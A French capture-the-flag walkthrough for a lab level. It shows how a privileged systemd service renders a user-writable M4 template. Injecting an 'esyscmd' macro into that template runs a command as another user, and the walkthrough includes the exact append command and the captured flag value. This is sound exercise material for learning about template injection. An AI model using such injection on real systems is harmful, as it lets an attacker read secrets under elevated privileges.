# Level04 — Exploiter un modèle M4 modifiable

## Objectif

Comprendre qu’un moteur de génération de texte peut aussi interpréter des instructions capables d’exécuter des commandes. Un modèle modifiable devient dangereux lorsqu’un service privilégié le traite comme du code.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
In the beginning was the Word.
```

L’indice ne donne ni un programme ni un chemin exploitable. On commence donc par chercher les chemins qui portent le nom du niveau actuel.

## 2. Trouver le service

```bash
find / -iname '*level04*' 2>/dev/null
```

Parmi les chemins trouvés figure `/opt/snowcrash/level04`. Examiner son contenu révèle le script `babel.sh` :

```bash
ls -la /opt/snowcrash/level04
```

Le nom du script donne le mot-clé `babel`, utilisé pour retrouver le service correspondant :

```bash
systemctl list-unit-files --all | grep -i babel
```

Le résultat est `babel.service`. Le nom du service est maintenant connu, mais pas encore son comportement.

## 3. Lire ce que le service exécute

```bash
systemctl cat babel.service
```

La sortie observée est :

```ini
[Service]
Type=oneshot
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
StandardOutput=journal
StandardError=journal
```

Cette sortie permet d’établir trois faits :

- le service s’exécute avec l’identité `flag04` ;
- il lance le script `/opt/snowcrash/level04/babel.sh` ;
- ses messages sont envoyés dans le journal système.

Le service ne donne pas encore le moteur utilisé, ni le nom du fichier traité. Le script est donc le prochain élément à examiner.

## 4. Suivre le script lancé par le service

```bash
cat /opt/snowcrash/level04/babel.sh
```

Le contenu du script montre que M4 traite `/var/lib/babel/templates/template.m4` et que le résultat est écrit dans `/var/lib/babel/output.conf`.

La chaîne devient alors concrète : `babel.service` lance `babel.sh` sous `flag04`, puis ce script donne le modèle à M4 et enregistre le résultat.

## 5. Examiner le modèle et ses permissions

```bash
id
ls -l /var/lib/babel/templates/template.m4
sed -n '1,80p' /var/lib/babel/templates/template.m4
```

La commande `sed` permet de lire le début du modèle sans partir d’une hypothèse sur son contenu. Les deux autres commandes permettent de vérifier que :

- le modèle `template.m4` est modifiable par `level04` ;
- `level04` possède, directement ou par groupe, le droit correspondant.

Le problème est maintenant établi, mais l’exploitation ne l’est pas encore : il faut comprendre les instructions reconnues par M4.

```text
template.m4 modifiable par level04
              │
              ▼
       M4 lancé par le service
              │
              ▼
   commande exécutée comme flag04
              │
              ▼
    résultat écrit dans output.conf
```

## 6. Comprendre M4

Le script a indiqué qu’il lance M4. M4 est un processeur de macros : il lit un texte, interprète les macros qu’il contient et produit un nouveau texte.

Exemple inoffensif :

```bash
echo "define(\`bonjour', \`Salut')bonjour" | m4
```

Résultat :

```text
Salut
```

La macro `bonjour` a été remplacée par `Salut`.

GNU M4 propose aussi `esyscmd`, une macro qui lance une commande shell et insère sa sortie dans le texte généré. On peut le constater avec une commande inoffensive :

```bash
printf "esyscmd(\`printf test')" | m4
```

Le résultat est :

```text
test
```

Cette fois, M4 n’a pas seulement remplacé du texte : il a exécuté `printf test`. Puisque le service lance M4 sous `flag04`, une commande placée dans le modèle serait lancée avec cette identité.

## 7. Construire le payload

Le fichier [payload.m4](payload.m4) contient une seule instruction :

```m4
esyscmd(`cat /home/flag04/.flag')
```

| Élément | Rôle |
| --- | --- |
| `esyscmd` | Exécuter une commande shell et récupérer sa sortie. |
| `cat` | Lire le contenu d’un fichier. |
| `/home/flag04/.flag` | Fichier que le service peut lire grâce aux droits de `flag04`. |
| Accent grave et apostrophe | Délimiter un argument avec la syntaxe de citation par défaut de M4. |

Le résultat de `cat` est inséré dans le document généré par M4, puis écrit dans `/var/lib/babel/output.conf`.

## 8. Modifier le modèle

Ajouter le payload à la fin du modèle :

```bash
cat >> /var/lib/babel/templates/template.m4 <<'EOF'
esyscmd(`cat /home/flag04/.flag')
EOF
```

La différence entre les opérateurs est importante :

- `>` remplace le contenu du fichier ;
- `>>` ajoute du contenu à la fin.

On utilise `>>` afin de conserver les instructions originales du modèle. Les apostrophes autour de `EOF` empêchent également le shell d’interpréter le contenu du payload.

## 9. Lire le résultat généré

Après le passage du service, afficher les dernières lignes de la sortie :

```bash
tail -n 3 /var/lib/babel/output.conf
```

Le secret apparaît dans le texte généré :

```text
ne2searoevaevoem4ov4ar8ap
```

`tail -n 3` limite l’affichage aux trois dernières lignes, là où la sortie de la macro ajoutée est attendue.
